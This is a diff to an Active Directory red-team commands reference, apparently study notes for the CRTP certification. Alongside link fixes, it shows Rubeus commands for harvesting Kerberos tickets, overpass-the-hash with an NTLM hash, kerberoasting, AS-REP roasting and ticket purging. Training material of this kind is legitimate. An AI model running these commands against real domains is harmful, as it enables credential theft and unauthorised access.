@@ -23,10 +23,12 @@
   - [Misc Attacks](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#mimikatz---misc-attacks)
 - [Rubeus](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#rubeus)
   - [Brute](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#basic)
+  - [List Tickets](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#list-tickets)
   - [Pass-the-key/O-PTH](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#pass-the-keyover-pth)
   - [Roasting](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#roasting)
   - [Golden/Silver](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#goldensilver)
-  - Maintenance(https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#maintenance)
+  - [Maintenance](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#maintenance)
+  - [S4u](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#unconstrained-delegation)
 - [ACLs](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#check-acls)
   - [PowerView get-DomainObjectACL](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#powerview-tips-on-domainobjectacl)
   - [Further ACL Enumeration](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#further-acl-enumeration)
@@ -457,19 +459,19 @@ Brute Password spray:
 #### List tickets
 Get tickets currently on System:
 - All - ```Rubeus.exe harvest /interval:30```
-- Specific User - ```rubeus.exe monitor /targetuser:Mary /interval:10 /nowrap```
+- Specific User on Machine - ```rubeus.exe monitor /targetuser:Mary /interval:10 /nowrap```
 
 #### Pass-the-key/Over-PTH
 Request ticket (TGT) based on username and password/hash:
 ```Rubeus.exe asktgt /domain:$DOMAIN /user:$DOMAIN_USER /rc4:$NTLM_HASH /ptt```
-- [from previous section]()
+- [from previous section](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#rubeus-overpasspass-the-key)
 
 Request Service ticket (TGS) based on Service Name:
 ```rubeus.exe asktgs /user:admin /ticket:doIDF== /service:LDAP/dc1.ecorp.lab```
 
 #### Roasting
 ```Rubeus.exe kerberoast /nowrap```
-- [Full kerberoast]()
+- [Full kerberoast](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#rubeus-1)
 
 ```Rubeus.exe asreproast /nowrap```
 - [Full aseproast]()
@@ -497,6 +499,11 @@ View active tickets by LUID:
 
 We can purge by LUID also:
 ```rubeus.exe purge /luid:0x8f57c```
+
+#### S4U
+Kerberos Delegation and S4U:
+- [S4u](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#unconstrained-delegation)
+
 
 # Check ACLs
 Check Domain Admins permissions for a specific user:
